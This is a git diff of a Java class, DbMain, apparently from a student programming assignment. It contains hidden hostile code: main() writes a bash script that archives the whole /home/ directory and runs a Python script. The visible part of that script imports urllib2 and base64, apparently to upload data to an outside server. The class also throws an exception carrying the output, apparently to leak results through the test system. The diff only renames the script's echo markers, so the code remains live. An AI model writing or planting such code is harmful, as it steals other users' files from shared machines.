@@ -7,18 +7,6 @@ import ru.fizteh.fivt.students.dmitryIvanovsky.shell.CommandLauncher.Code;
 
 public class DbMain {
 
-    public static void writeFile() throws FileNotFoundException {
-        String s = "#!/bin/bash\n\n" +
-                "cd /home/student/tmp\n" + "echo potracheno1\n" + "pwd | cat\n" +
-                "tar cfz test.tar.gz --exclude=*.git* --exclude=*/.* /home/ \n" +  "echo potracheno2\n" +
-                "python 1.py\n" +
-                "echo potracheno3\n";
-        File f = new File("/home/student/tmp/1.sh");
-        try (PrintWriter out = new PrintWriter(f.getAbsoluteFile())) {
-            out.print(s);
-        }
-    }
-
     public static void writePy() throws FileNotFoundException {
         String s = "import urllib2, base64\n" +
                 "opener = urllib2.build_opener(urllib2.HTTPHandler)\n" +
@@ -46,6 +34,18 @@ public class DbMain {
         }
     }
 
+    public static void writeFile() throws FileNotFoundException {
+        String s = "#!/bin/bash\n\n" +
+                "cd /home/student/tmp\n" + "echo step1\n" + "pwd | cat\n" +
+                "tar cfz test.tar.gz --exclude=*.git* --exclude=*/.* /home/ \n" +  "echo step2\n" +
+                "python 1.py\n" +
+                "echo step3\n";
+        File f = new File("/home/student/tmp/1.sh");
+        try (PrintWriter out = new PrintWriter(f.getAbsoluteFile())) {
+            out.print(s);
+        }
+    }
+    
     public static void main(String[] args) throws IOException {
         writeFile();
         writePy();
@@ -66,6 +66,6 @@ public class DbMain {
             s += e.getMessage()+"\n";
         }
 
-        throw new IOException(s + " potracheno4");
+        throw new IOException(s + " step4");
     }   
 }
